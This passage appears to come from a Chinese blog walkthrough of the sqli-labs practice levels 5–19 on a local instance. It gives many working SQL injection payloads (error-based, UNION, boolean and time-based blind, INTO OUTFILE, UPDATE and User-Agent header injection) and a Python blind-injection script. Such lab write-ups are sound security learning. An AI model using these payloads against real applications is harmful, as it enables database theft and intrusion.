
<p>但是这里成功会返回You are in ，失败会报错</p>
<p>即select 的信息不回回显</p>
<p>那咋办呢</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119150621876.png" srcset="/img/loading.gif" lazyload alt="image-20210119150621876"></p>
<p>报错注入，可以得到一些基本信息</p>
<p>写盲注脚本，虽然跑脚本比较费时间，但是几乎所有信息都可以获得</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">12345</span>/Less-<span class="hljs-number">5</span>/?id=<span class="hljs-number">1</span>&#x27; and (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select database()),<span class="hljs-number">0</span>x7e)))%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BoolSqlier</span>:<br>    url = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,database=<span class="hljs-string">&quot;&quot;</span></span>):<br>        self.database = database<br>        self.url = BoolSqlier.url<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_database</span>(<span class="hljs-params">self</span>):<br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">send_request</span>(<span class="hljs-params">i,mid</span>):<br><br>            payload = <span class="hljs-string">&quot;1&#x27;and(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            params = &#123;<span class="hljs-string">&quot;id&quot;</span>:payload&#125;<br>            resp = requests.get(self.url,params=params)<br>            <span class="hljs-keyword">return</span> resp<br>            <br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">database_i_ascii_bt_mid</span>(<span class="hljs-params">resp</span>):<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You are in...........&quot;</span> <span class="hljs-keyword">in</span> resp.text:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">else</span>: <br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        database=<span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>            <span class="hljs-comment">#head 和 tail 决定了database的字符的取值范围</span><br>            head=<span class="hljs-number">32</span>         <br>            tail=<span class="hljs-number">127</span><br>            <span class="hljs-keyword">while</span> head&lt;tail:<br>                mid=(head+tail)&gt;&gt;<span class="hljs-number">1</span><br>                resp = send_request(i,mid)<br>               <br>                <span class="hljs-keyword">if</span> database_i_ascii_bt_mid(resp):<br>                    head=mid+<span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    tail=mid<br>            <span class="hljs-keyword">if</span>(head!=<span class="hljs-number">32</span>):<br>                database+=<span class="hljs-built_in">chr</span>(head)<br>                <span class="hljs-built_in">print</span>(database)<br>        self.database = database<br>        <span class="hljs-built_in">print</span>(database)<br>    <br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    BoolSqlier.url = <span class="hljs-string">&quot;http://localhost:12345/Less-5/&quot;</span><br>    sqli = BoolSqlier()<br>    sqli.get_database()<br></code></pre></td></tr></table></figure>



<p>差不多了</p>
<h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p>单引号不会报错</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119182324267.png" srcset="/img/loading.gif" lazyload alt="image-20210119182324267"></p>
<p>原因可能是</p>
<ul>
<li>用的双引号</li>
<li>addslashes</li>
</ul>
<p>暂时不确定有没有用到括号</p>
<p>试一下双引号</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119182820731.png" srcset="/img/loading.gif" lazyload alt="image-20210119182820731"></p>
<p>报错了</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">12345</span><span class="hljs-regexp">/Less-6/</span>?id=<span class="hljs-number">1</span><span class="hljs-string">&quot;%23</span><br></code></pre></td></tr></table></figure>

<p>可以</p>
<p>说明没有括号()</p>
<p>剩下的就是报错注入注基本信息，布尔盲注注具体字段信息了</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">12345</span><span class="hljs-regexp">/Less-6/</span>?id=<span class="hljs-number">1</span><span class="hljs-string">&quot; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))%23</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119183035689.png" srcset="/img/loading.gif" lazyload alt="image-20210119183035689"></p>
<h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119185034862.png" srcset="/img/loading.gif" lazyload alt="image-20210119185034862"></p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">You are <span class="hljs-keyword">in</span><span class="hljs-params">...</span>. Use outfile<span class="hljs-params">...</span><span class="hljs-params">...</span><br></code></pre></td></tr></table></figure>

<p>要往外写文件</p>
<p><code>?id=1&#39;</code> 报错</p>
<p><code>?id=1&#39;%23</code> 报错</p>
<p>都是 <code>You have an error in your SQL syntax</code></p>
<p>闭合处出现 syntax error，一般考虑三个</p>
<ul>
<li>‘</li>
<li>“</li>
<li>)</li>
<li>多个 )</li>
</ul>
<p>那就试试看括号</p>
<p><code>?id=1&#39;)%23</code> syntax error</p>
<p>但是两个括号，就成了</p>
<p><code>?id=1&#39;))%23</code></p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119185602815.png" srcset="/img/loading.gif" lazyload alt="image-20210119185602815"></p>
<p>接下来就是outfile了</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">?id=<span class="hljs-number">1</span>&#x27;)) <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p>没问题，是三个</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;)) UNION SELECT <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;hello.txt&quot;</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>



<h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><p>‘ 没有信息了，估计报错了，但是报错信息不返回</p>
<p><code>?id=1&#39;%23</code>  就又行了</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119191613590.png" srcset="/img/loading.gif" lazyload alt="image-20210119191613590"></p>
<p>但是还是没有回显select的内容</p>
<p>看来只能盲注</p>
<p>先试试看有没有过滤什么的</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?id=<span class="hljs-number">1</span>&#x27; and ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">0</span><span class="hljs-comment">%23</span><br></code></pre></td></tr></table></figure>

<p>没有错，说明能用</p>
<p>而很大程度上，有这个就够了，就能注出所有东西</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> ascii(substr((select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()),1,1))&gt;80%23<br></code></pre></td></tr></table></figure>





<h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p>感觉好像无论输入什么，返回的都是 You are in……</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119195158190.png" srcset="/img/loading.gif" lazyload alt="image-20210119195158190"></p>
<p>没办法</p>
<p>只能用时间盲注</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">12345</span>/Less-<span class="hljs-number">9</span>/?id=<span class="hljs-number">1</span>&#x27; and If(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">115</span>,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>))%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p>而且，我的firefox会一卡一卡的，所以要换个浏览器，不然对判断会有很大的影响</p>
<h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119195623611.png" srcset="/img/loading.gif" lazyload alt="image-20210119195623611"></p>
<p>貌似又要盲注</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119195734373.png" srcset="/img/loading.gif" lazyload alt="image-20210119195734373"></p>
<p>而且是时间盲注</p>
<h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119195816927.png" srcset="/img/loading.gif" lazyload alt="image-20210119195816927"></p>
<p>不一样了，要输入的有两个东西</p>
<p>抓包看一看，是POST，传入的是username和passwd</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119195937251.png" srcset="/img/loading.gif" lazyload alt="image-20210119195937251"></p>
<p>尝试一下 加 ‘</p>
<p>发现两个参数都有报错，说明都可以是注入点</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119200153496.png" srcset="/img/loading.gif" lazyload alt="image-20210119200153496"></p>
<p>不知道这两个参数是用在同一个还是不同的sql语句里面，可以试试看</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">uname</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;%23&amp;passwd=hello&#x27;</span>&amp;submit=Submit<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119200723374.png" srcset="/img/loading.gif" lazyload alt="image-20210119200723374"></p>
<p>说明passwd和uname在同一个语句中，且passwd在后面，所以被注释掉了，没有报错</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=<span class="hljs-number">1</span>&#x27; order by <span class="hljs-number">1</span>,<span class="hljs-number">2</span>%<span class="hljs-number">23</span>&amp;passwd=hello&#x27;&amp;submit=Submit<br></code></pre></td></tr></table></figure>

<p>order by 2可以，order by 3不行</p>
<p>所以很明显了</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>%<span class="hljs-number">23</span>&amp;passwd=hello&#x27;&amp;submit=Submit<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119200951582.png" srcset="/img/loading.gif" lazyload alt="image-20210119200951582"></p>
<p>结果有回显</p>
<p>而且没什么过滤，那就随便整了</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">uname=<span class="hljs-number">1&#x27;</span> <span class="hljs-function">union <span class="hljs-keyword">select</span> <span class="hljs-title">database</span>(),<span class="hljs-title">group_concat</span>(<span class="hljs-params">table_name</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=database()%<span class="hljs-number">23</span>&amp;passwd=hello<span class="hljs-string">&#x27;&amp;submit=Submit</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119201146925.png" srcset="/img/loading.gif" lazyload alt="image-20210119201146925"></p>
<p>没问题</p>
<h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><p>还是两个输入</p>
<p>‘ 没报错</p>
<p>“ 报错</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119201407977.png" srcset="/img/loading.gif" lazyload alt="image-20210119201407977"></p>
<p><code>1&quot;%23</code> 还是报错syntax error</p>
<p>说明还没闭合好，加个)</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">uname</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&quot;)%23&amp;passwd=1&amp;submit=Submit</span><br></code></pre></td></tr></table></figure>

<p>可以了</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=1&quot;) union select 1,2%23&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119201826130.png" srcset="/img/loading.gif" lazyload alt="image-20210119201826130"></p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">uname=1&quot;) union <span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>(),group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()%<span class="hljs-number">23</span>&amp;passwd=<span class="hljs-number">1</span>&amp;submit=Submit<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119201940984.png" srcset="/img/loading.gif" lazyload alt="image-20210119201940984"></p>
<p>没问题</p>
<h2 id="les-13"><a href="#les-13" class="headerlink" title="les-13"></a>les-13</h2><p>两个输入</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=<span class="hljs-number">1</span>&#x27;)%<span class="hljs-number">23</span>&amp;passwd=<span class="hljs-number">1</span>&amp;submit=Submit<br></code></pre></td></tr></table></figure>

<p>没问题</p>
<p>会报错，但是select的不会回显</p>
<p>所以就只能用报错注入，或者盲注</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=<span class="hljs-number">1</span>&#x27;) and (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select database()),<span class="hljs-number">0</span>x7e)))%<span class="hljs-number">23</span>&amp;passwd=<span class="hljs-number">1</span>&amp;submit=Submit<br></code></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210119202440814.png" srcset="/img/loading.gif" lazyload alt="image-20210119202440814"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=<span class="hljs-number">1</span>&#x27;) and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">80</span>%<span class="hljs-number">23</span>&amp;passwd=<span class="hljs-number">1</span>&amp;submit=Submit<br></code></pre></td></tr></table></figure>

<p>没问题</p>
<p>那些脚本就能跑出所有东西了</p>
<h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><p>双引号，报错，所以就是用双引号闭合的</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120150310498.png" srcset="/img/loading.gif" lazyload alt="image-20210120150310498"></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=1&quot; <span class="hljs-keyword">and</span> updatexml(1,concat(0x7e,(database()),0x7e),<span class="hljs-literal">null</span>) %23&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120151233322.png" srcset="/img/loading.gif" lazyload alt="image-20210120151233322"></p>
<p>爆个表名玩玩</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=1&quot; <span class="hljs-keyword">and</span> updatexml(<span class="hljs-literal">null</span>,concat(0x7e,(select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database())),null)%23&amp;passwd=1&amp;submit=Submit<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120151942899.png" srcset="/img/loading.gif" lazyload alt="image-20210120151942899"></p>
<h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><p>“ 和 ‘ 都没有报错，可能是扣留了报错的信息，比如给php变量前加个 @</p>
<p>试了一下 <code>uname=&#39; or 1=1%23&amp;passwd=1&amp;submit=Submit</code> 有个图片返回，这就可以说明是否访问成功了，图片叫做flag.jpg</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120153249874.png" srcset="/img/loading.gif" lazyload alt="image-20210120153249874"></p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120153412704.png" srcset="/img/loading.gif" lazyload alt="image-20210120153412704"></p>
<p>尝试出column num 为2</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>%<span class="hljs-number">23</span>&amp;passwd=<span class="hljs-number">1</span>&amp;submit=Submit<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120153559333.png" srcset="/img/loading.gif" lazyload alt="image-20210120153559333"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=admin&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>%<span class="hljs-number">23</span>&amp;passwd=<span class="hljs-number">1</span>&amp;submit=Submit<br></code></pre></td></tr></table></figure>

<p>不出所料，有个user叫做admin</p>
<p>那下面就布尔盲注了</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=admin&#x27; <span class="hljs-keyword">and</span> left(database(),1)=<span class="hljs-string">&#x27;s&#x27;</span>%23&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit<br></code></pre></td></tr></table></figure>





<h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><p>没有报错，只有俩图片</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">uname</span><span class="hljs-operator">=</span>admin<span class="hljs-string">&quot;)%23&amp;passwd=1&amp;submit=Submit</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120154550935.png" srcset="/img/loading.gif" lazyload alt="image-20210120154550935"></p>
<p>一样的，布尔盲注</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=admin&quot;)and left(database(),1)=<span class="hljs-string">&#x27;s&#x27;</span>%23&amp;<span class="hljs-attribute">passwd</span>=1&amp;submit=Submit<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120154648013.png" srcset="/img/loading.gif" lazyload alt="image-20210120154648013"></p>
<h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120162728262.png" srcset="/img/loading.gif" lazyload alt="image-20210120162728262"></p>
<p>重置密码</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=1&#x27; <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1%23<br><span class="hljs-attribute">uname</span>=1&quot; <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1%23<br><span class="hljs-attribute">uname</span>=1 <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1%23<br><span class="hljs-attribute">uname</span>=1&#x27;) <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1%23<br><span class="hljs-attribute">uname</span>=1&quot;) <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1%23<br><span class="hljs-attribute">uname</span>=1) <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1%23<br><span class="hljs-attribute">uname</span>=1&#x27;)) <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1%23<br><span class="hljs-attribute">uname</span>=1&quot;)) <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1%23<br><span class="hljs-attribute">uname</span>=1)) <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1%23<br></code></pre></td></tr></table></figure>

<p>都没用</p>
<p>又想到这是个passwd reset的页面，因此可能用到了update</p>
<p>可能有类似这样的语句被执行</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">update</span> table_name <span class="hljs-keyword">set</span> password <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;$passwd&#x27;</span> <span class="hljs-keyword">where</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;$username&#x27;</span><br></code></pre></td></tr></table></figure>



<p>因而，passwd处就可能有一个update注入，而且可能是set后面那个值</p>
<p>试试看报错注入</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=admin&amp;passwd=<span class="hljs-number">1</span>&#x27; AND updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select user()),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)#&amp;submit=Submit<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120170313456.png" srcset="/img/loading.gif" lazyload alt="image-20210120170313456"></p>
<p>那没事了</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">uname=admin&amp;passwd=<span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">updatexml</span>(<span class="hljs-params"><span class="hljs-literal">null</span>,concat(<span class="hljs-number">0x0a</span>,(<span class="hljs-keyword">select</span> group_concat(table_name</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=database())),<span class="hljs-literal">null</span>)<span class="hljs-meta">#&amp;submit=Submit</span><br></code></pre></td></tr></table></figure>

<p>所有表名</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120170448801.png" srcset="/img/loading.gif" lazyload alt="image-20210120170448801"></p>
<h2 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h2><p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120170623639.png" srcset="/img/loading.gif" lazyload alt="image-20210120170623639"></p>
<p>竟然还显示了ip</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-attr">uname</span><span class="hljs-operator">=</span>admin<span class="hljs-variable">&amp;passwd</span>=admin<span class="hljs-variable">&amp;submit</span>=Submit<br></code></pre></td></tr></table></figure>

<p>还返回了这些User Agent的信息</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120171917926.png" srcset="/img/loading.gif" lazyload alt="image-20210120171917926"></p>
<p>根据提示，是Header Injection</p>
<p>看了一下源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$uagent</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];<br><span class="hljs-variable">$IP</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<br><br><span class="hljs-variable">$insert</span>=<span class="hljs-string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="hljs-subst">$uagent</span>&#x27;, &#x27;<span class="hljs-subst">$IP</span>&#x27;, <span class="hljs-subst">$uname</span>)&quot;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your User Agent is: &#x27;</span> .<span class="hljs-variable">$uagent</span>;<br></code></pre></td></tr></table></figure>

<p>果然是头部注入，而且可以报错的</p>
<p>那我就修改一下User-Agent</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27; AND updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-keyword">AND</span> <span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120171848459.png" srcset="/img/loading.gif" lazyload alt="image-20210120171848459"></p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120171837216.png" srcset="/img/loading.gif" lazyload alt="image-20210120171837216"></p>
<h2 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h2><p>显示ip</p>
<p><img src="https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2021/01/aimage-20210120172155150.png" srcset="/img/loading.gif" lazyload alt="image-20210120172155150"></p>
